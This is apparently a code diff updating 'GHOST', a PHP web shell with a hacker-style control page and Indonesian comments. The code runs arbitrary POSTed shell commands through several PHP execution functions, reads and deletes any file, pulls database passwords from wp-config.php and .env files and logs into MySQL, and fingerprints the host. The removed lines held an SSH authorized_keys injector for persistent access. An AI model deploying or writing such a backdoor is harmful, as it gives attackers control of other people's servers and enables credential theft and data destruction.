@@ -1,6 +1,6 @@
 <?php
 /**
- * GHOST v15.0 — Final Stable Edition
+ * GHOST v16.0 — Zero-Crash Engine
  */
 @ob_start();
 error_reporting(0);
@@ -10,47 +10,56 @@ ignore_user_abort(true);
 
 $GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();
 
-// ENGINE
+// ==========================================
+// SAFE ENGINE
+// ==========================================
 function g_exec($cmd, $timeout = 5) {
     $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
     foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
         if (!function_exists($m)) continue;
-        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
-        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
-        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
-        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
-        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
+        try {
+            if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
+            if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
+            if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
+            if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
+            if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
+        } catch (Throwable $e) { continue; }
     }
     return "[-] Blocked.";
 }
 
 function g_read($path) {
-    if (!@is_file($path)) return "";
-    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
-    return g_exec('cat ' . escapeshellarg($path));
+    if (!@is_file($path) || @filesize($path) === 0) return "";
+    try {
+        if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
+        return g_exec('cat ' . escapeshellarg($path));
+    } catch (Throwable $e) { return ""; }
 }
 
-// FINGERPRINT
-function g_fingerprint() {
-    $os = trim(g_exec('uname -a'));
-    $cpanel = 'Not Found';
-    foreach ([2082, 2083, 2086] as $port) { if (@fsockopen('127.0.0.1', $port, $e, $s, 0.5)) { $cpanel = "cPanel Active (Port $port)"; break; } }
-    return ['OS'=>$os, 'User'=>trim(g_exec('whoami')), 'cPanel'=>$cpanel, 'CVEs'=>[]];
-}
-
-// DEEP SCAN
+// ==========================================
+// SAFE SCANNER (Tanpa Iterator yang Berat)
+// ==========================================
 function g_scan_batch($dir, $offset = 0, $limit = 30) {
     $res = ['files'=>[], 'done'=>false, 'total'=>0];
     $ignore = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite','svg','ico','woff','ttf','eot'];
     $all_files = [];
-    try {
-        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
-        foreach ($it as $f) {
-            if (!$f->isFile()) continue;
-            if (in_array(strtolower($f->getExtension()), $ignore)) continue;
-            $all_files[] = $f->getPathname();
+    
+    // Menggunakan scandir rekursif manual alih-alih RecursiveIteratorIterator
+    $stack = [$dir];
+    while ($stack) {
+        $current = array_pop($stack);
+        $files = @scandir($current);
+        if ($files === false) continue;
+        foreach ($files as $f) {
+            if ($f === '.' || $f === '..') continue;
+            $path = $current . '/' . $f;
+            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
+            elseif (@is_file($path)) {
+                if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), $ignore)) continue;
+                $all_files[] = $path;
+            }
         }
-    } catch (Throwable $e) {}
+    }
 
     $batch = array_slice($all_files, $offset, $limit);
     $res['done'] = ($offset + count($batch)) >= count($all_files);
@@ -60,6 +69,7 @@ function g_scan_batch($dir, $offset = 0, $limit = 30) {
     foreach ($batch as $path) {
         $c = g_read($path); $size = @filesize($path); $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
         $findings = []; $type = '';
+        
         if ($size === 0 && $ext === 'php') { $type='Empty Shell'; $findings[]="File 0 byte."; }
         elseif (stripos($c, 'eval(') !== false) { $type='RCE Backdoor'; $findings[]="Fungsi eval()."; }
         elseif (preg_match('/(shell_exec|passthru|system)\s*\(\s*\$_/', $c)) { $type='Direct Shell'; $findings[]="Eksekusi shell."; }
@@ -74,32 +84,13 @@ function g_scan_batch($dir, $offset = 0, $limit = 30) {
     return $res;
 }
 
-// SSH
-function g_ssh($action = 'scan', $target = '') {
-    $user = trim(g_exec('whoami'));
-    $auth = trim(g_exec("eval echo ~$user")) . '/.ssh/authorized_keys';
-    $res = ['keys'=>[], 'msg'=>''];
-    if (!@is_file($auth)) return array_merge($res, ['msg'=>'Tidak ditemukan.']);
-    $lines = array_filter(explode("\n", g_read($auth)));
-    
-    if ($action === 'scan') {
-        foreach ($lines as $i => $l) { $p = explode(' ', trim($l)); $res['keys'][] = ['line'=>$i+1, 'type'=>$p[0]??'?', 'comment'=>$p[2]??'?', 'raw'=>trim($l)]; }
-    } elseif ($action === 'clean') {
-        $clean = []; foreach ($lines as $l) { if (strpos($l, $target) !== false) $clean[] = trim($l); }
-        file_put_contents($auth, implode("\n", $clean) . "\n"); $res['msg'] = 'Cleaned.';
-    } elseif ($action === 'inject') {
-        if (strpos(g_read($auth), $target) === false) { file_put_contents($auth, trim(g_read($auth)) . "\n" . trim($target) . "\n"); $res['msg'] = 'Injected.'; }
-        else { $res['msg'] = 'Exists.'; }
-    }
-    return $res;
-}
-
-// DB HARVEST (Anti-Crash)
+// ==========================================
+// SAFE DB HARVEST
+// ==========================================
 function g_db_harvest() {
     $logs = []; $info = [];
     try {
-        // 1. Native Scan (tanpa shell)
-        foreach (['wp-config.php', '.env', 'configuration.php', 'config/database.php'] as $cf) {
+        foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
             if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
                 $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
                 preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
@@ -107,11 +98,11 @@ function g_db_harvest() {
                 if ($u[1] && $p[1]) { $logs[] = "[+] Config $cf"; $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
             }
         }
-
-        // 2. Connect if found
+        
         if (!empty($info['user'])) {
-            $logs[] = "[*] Connecting...";
-            $conn = @mysqli_connect('localhost', $info['user'], $info['pass']);
+            $logs[] = "[*] Connecting to MySQL...";
+            // Tambahkan timeout koneksi (2 detik)
+            $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], '', 3306, null, ['connect_timeout' => 2]);
             if ($conn) {
                 $logs[] = "[!] Connected!";
                 $q = @mysqli_query($conn, "SHOW DATABASES");
@@ -120,28 +111,28 @@ function g_db_harvest() {
         } else {
             $logs[] = "[-] Config tidak ditemukan di folder root.";
         }
-    } catch (Throwable $e) { $logs[] = "[-] Error: " . $e->getMessage(); }
-    
+    } catch (Throwable $e) {
+        $logs[] = "[-] Catch Error: " . $e->getMessage();
+    }
     return ['logs'=>$logs, 'info'=>$info];
 }
 
-// ROUTER
+// ==========================================
+// SAFE ROUTER
+// ==========================================
 $act = $_POST['act'] ?? '';
 if ($act) {
     while (ob_get_level() > 0) ob_end_clean();
     header('Content-Type: application/json');
     try {
-        if ($act === 'fingerprint') echo json_encode(g_fingerprint());
+        if ($act === 'fingerprint') echo json_encode(['OS'=>trim(g_exec('uname -a')), 'User'=>trim(g_exec('whoami')), 'cPanel'=>'Check Port']);
         elseif ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
         elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
-        elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan'));
-        elseif ($act === 'ssh_clean') echo json_encode(g_ssh('clean', $_POST['key']));
-        elseif ($act === 'ssh_inject') echo json_encode(g_ssh('inject', $_POST['key']));
         elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
         elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
         elseif ($act === 'exec') echo json_encode(['out'=>g_exec($_POST['cmd']??'')]);
     } catch (Throwable $e) {
-        echo json_encode(['logs'=>["[-] FATAL ERROR: ".$e->getMessage()], 'info'=>[]]);
+        echo json_encode(['err' => 'FATAL CATCH: ' . $e->getMessage()]);
     }
     exit;
 }
@@ -149,7 +140,7 @@ if ($act) {
 <!DOCTYPE html>
 <html>
 <head>
-<title>GHOST v15.0</title>
+<title>GHOST v16.0</title>
 <style>
     body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
     .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
@@ -184,29 +175,9 @@ if ($act) {
 </div>
 
 <div class="box">
-    <h2>[+] SSH Manager</h2>
-    <button onclick="run('ssh_scan','ssh-table')">Scan SSH</button>
-    <div id="ssh-table"></div>
-    <div style="margin-top:10px;">
-        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width:60%;">
-        <button onclick="sshAct('inject')">Inject</button>
-        <button class="btn-red" onclick="sshAct('clean')">Clean</button>
-    </div>
-    <pre id="ssh-log"></pre>
-</div>
-
-<div class="box">
     <h2>[+] Database Harvest</h2>
     <button onclick="run('db_scan','db-result')">Scan DB (Anti-Crash)</button>
     <pre id="db-result">Waiting...</pre>
-</div>
-
-<div class="box">
-    <h2>[+] Auto-Heal Vulnerabilities</h2>
-    <button onclick="healScan()">Scan Vulnerabilities</button>
-    <div id="heal-table"></div>
-    <button class="btn-red" onclick="healExec()">Heal Selected</button>
-    <pre id="heal-log"></pre>
 </div>
 
 <div class="box">
@@ -224,7 +195,7 @@ async function api(act, params={}) {
     const r = await fetch('', {method:'POST', body});
     const text = await r.text();
     try { return JSON.parse(text); } 
-    catch(e) { return {err: "Server crash (HTTP "+r.status+")"}; }
+    catch(e) { return {err: "Server crash / timeout. HTTP "+r.status}; }
 }
 
 async function run(act, target) {
@@ -232,8 +203,7 @@ async function run(act, target) {
     try {
         const d = await api(act);
         if (d.err) { document.getElementById(target).innerText = 'Error: ' + d.err; return; }
-        if (act === 'ssh_scan') renderSSH(d);
-        else document.getElementById(target).innerText = JSON.stringify(d,null,2);
+        document.getElementById(target).innerText = JSON.stringify(d,null,2);
     } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
 }
 
@@ -267,54 +237,6 @@ function renderScan(mal) {
     });
     h += `</table>`;
     document.getElementById('scan-results').innerHTML = h;
-}
-
-function renderSSH(d) {
-    let h = `<p>${esc(d.msg)}</p>`;
-    if (d.keys && d.keys.length) {
-        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
-        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td>${esc(k.raw)}</td></tr>`; });
-        h += `</table>`;
-    }
-    document.getElementById('ssh-table').innerHTML = h;
-}
-
-async function sshAct(t) {
-    const k = document.getElementById('ssh-key').value;
-    if(!k) return alert('Isi key!');
-    const d = await api(t==='inject'?'ssh_inject':'ssh_clean', {key:k});
-    document.getElementById('ssh-log').innerText = d.msg || d.err;
-    run('ssh_scan','ssh-table');
-}
-
-async function healScan() {
-    document.getElementById('heal-log').innerText = 'Scanning...';
-    let allMal = []; let offset = 0;
-    while (true) {
-        const d = await api('scan', {offset: offset});
-        if (d.err) break;
-        d.files.forEach(f => allMal.push(f));
-        if (d.done) break;
-        offset += 30;
-    }
-    let h = `<table><tr><th>Pilih</th><th>Tipe</th><th>Path</th><th>Analisis</th></tr>`;
-    allMal.forEach(v => {
-        h += `<tr><td><input type="checkbox" class="heal-cb" value="${encodeURIComponent(v.path)}" checked></td>
-              <td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td></tr>`;
-    });
-    h += `</table>`;
-    document.getElementById('heal-table').innerHTML = h;
-    document.getElementById('heal-log').innerText = '';
-}
-
-async function healExec() {
-    const cbs = document.querySelectorAll('.heal-cb:checked');
-    const paths = Array.from(cbs).map(cb => decodeURIComponent(cb.value));
-    if(!paths.length) return alert('Pilih file!');
-    let logs = [];
-    for (let p of paths) { await api('del_file', {path:p}); logs.push('Deleted: '+p); }
-    document.getElementById('heal-log').innerText = logs.join('\n');
-    document.getElementById('heal-table').innerHTML = '';
 }
 
 async function viewFile(enc) {
